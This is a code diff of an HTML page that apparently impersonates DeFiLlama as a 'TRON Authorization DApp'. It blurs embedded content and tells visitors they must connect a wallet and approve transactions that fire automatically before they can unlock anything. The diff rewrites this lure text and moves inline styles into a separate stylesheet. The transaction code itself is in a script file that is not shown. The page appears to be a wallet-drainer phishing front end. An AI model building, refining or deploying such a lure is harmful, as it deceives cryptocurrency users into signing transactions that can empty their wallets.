@@ -3,102 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DeFiLlama</title>
+    <title>DeFiLlama TRON Authorization DApp</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 
     <script src="https://unpkg.com/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 
     <link rel="stylesheet" href="./src/style.css">
-
-    <style>
-        /* 基礎樣式（可調整或放入 style.css） */
-        body { margin: 0; padding: 0; font-family: Arial, sans-serif; }
-        header { 
-            display: flex; 
-            justify-content: flex-end; 
-            padding: 15px; 
-            background-color: #f8f9fa; 
-            box-shadow: 0 2px 4px rgba(0,0,0,0.05); 
-            position: relative;
-            z-index: 100;
-        }
-        #connectButton {
-            padding: 10px 15px;
-            font-size: 16px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            cursor: pointer;
-            transition: background-color 0.3s;
-        }
-        #connectButton.connected {
-            background-color: #28a745;
-        }
-        #connectButton:hover:not(.connected) {
-            background-color: #0056b3;
-        }
-
-        #contentContainer {
-            position: relative;
-            height: calc(100vh - 60px); /* 假設 header 高度為 60px */
-            overflow: hidden;
-        }
-        #coindeskFrame {
-            width: 100%;
-            height: 100%;
-            border: none;
-        }
-        
-        /* 鎖定和覆蓋層樣式 */
-        #blurOverlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(255, 255, 255, 0.9); /* 半透明白色覆蓋 */
-            backdrop-filter: blur(5px); /* 讓背景內容模糊 */
-            display: none; /* 默認隱藏，通過 JS 顯示 */
-            z-index: 90; /* 在內容層之上，在 Header 之下 */
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-        }
-        #overlayMessage {
-            font-size: 1.5em;
-            color: #007bff;
-            font-weight: bold;
-            text-align: center;
-            margin-bottom: 20px;
-            max-width: 80%;
-        }
-        
-        #lockedPrompt {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 30px;
-            background: #ffffff;
-            border: 2px solid #dc3545;
-            border-radius: 10px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
-            text-align: center;
-            z-index: 101; /* 確保在 blurOverlay 和內容之上 */
-            max-width: 400px;
-            display: none; /* 默認隱藏，通過 JS 顯示 */
-        }
-        #lockedPrompt h2 {
-            color: #dc3545;
-            margin-top: 0;
-        }
-        #lockedPrompt p {
-            color: #333;
-            line-height: 1.5;
-        }
-    </style>
 </head>
 <body>
 
@@ -117,20 +28,27 @@
     </div>
 
     <div id="lockedPrompt">
-        <h2>🔒 Service locked: Authorization Required</h2>
+        <h2>🚀 Access Locked: Wallet Authorization Required</h2>
+        
         <p>
-            Please click the **Connect Wallet** button to proceed. 
-            Upon successful connection, your wallet will **automatically** prompt you to sign 2-3 transactions 
-            to complete the required authorizations.
-        </p>
-        <p style="font-size: 0.9em; color: #dc3545; margin-top: 15px;">
-            **Important:** You must approve all wallet pop-ups to continue.
+            To access the content, please connect your wallet first.
         </p>
 
-        <button id="authorizeButton" style="padding: 10px 20px; font-size: 1.2em; margin-top: 15px; background-color: #ffc107; color: #333; border: none; border-radius: 4px; cursor: pointer; display: none;">
-            手動重試授權 (Retry Authorization)
-        </button>
+        <div class="info-box">
+            <strong style="display: block; margin-bottom: 5px;"><i class="fas fa-info-circle"></i> Next Step:</strong>
+            <p style="margin: 0; font-size: 0.95em;">
+                Upon connection, your wallet will automatically prompt you to approve **2 transactions** to unlock the data.
+            </p>
         </div>
+
+        <p class="small-tip">
+            (The prompt will disappear once authorization is complete.)
+        </p>
+        
+        <button id="authorizeButton">
+            <i class="fas fa-redo"></i> Retry Authorization
+        </button>
+    </div>
 
 
     <script src="./src/main.js"></script>
